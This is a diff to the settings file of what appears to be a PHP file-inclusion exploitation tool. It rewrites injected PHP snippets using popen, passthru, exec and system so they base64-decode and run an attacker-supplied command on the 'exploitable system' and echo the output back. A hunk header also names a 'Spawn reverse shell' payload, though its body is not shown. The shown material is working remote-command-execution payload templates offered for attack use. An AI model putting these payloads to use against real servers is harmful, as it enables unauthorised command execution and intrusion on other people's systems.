@@ -151,12 +151,12 @@ settings["shell_test"] = ("echo $((77*77))", "5929")
 
 # PHP Execution Methods. Methods to execute system commands on the exploitable system. 
 # In best case it should echo all stuff back to us.
-# __PAYLOAD__ will be replaces by the actual command.
+# __PAYLOAD__ will be replaces by the actual command. Also it will be base64 encoded! So don't forget to decode it!
 settings["php_exec"]=[]
-settings["php_exec"].append(("popen","<? $h=popen(\"__PAYLOAD__ 2>&1\", \"r\");while(!feof($h)){$l=fread($h, 2024);echo $l;}?>"))
-settings["php_exec"].append(("passthru", "<? passthru (\"__PAYLOAD__\"); ?>"))
-settings["php_exec"].append(("exec", "<? exec (\"__PAYLOAD__\"); ?>"))
-settings["php_exec"].append(("system", "<? system (\"__PAYLOAD__\"); ?>"))
+settings["php_exec"].append(("popen","<? $h=popen(base64_decode(\"__PAYLOAD__\") . \" 2>&1\", \"r\");while(!feof($h)){$l=fread($h, 2024);echo $l;}?>"))
+settings["php_exec"].append(("passthru", "<? passthru (base64_decode(\"__PAYLOAD__\"). \" 2>&1\"); ?>"))
+settings["php_exec"].append(("exec", "<? echo exec (base64_decode(\"__PAYLOAD__\"). \" 2>&1\"); ?>"))
+settings["php_exec"].append(("system", "<? system (base64_decode(\"__PAYLOAD__\"). \" 2>&1\"); ?>"))
 
 
 settings["payloads"] = {}
@@ -210,4 +210,4 @@ settings["payloads"]["php"]["Spawn reverse shell"] = (
 #                                             )
 
 # There is no maximum count of questions you can define.
-# Userinput quotes and so on will NOT be escaped at the moment.
+# Because the userinput is base64 encoded you can use quotes now as much as you want.
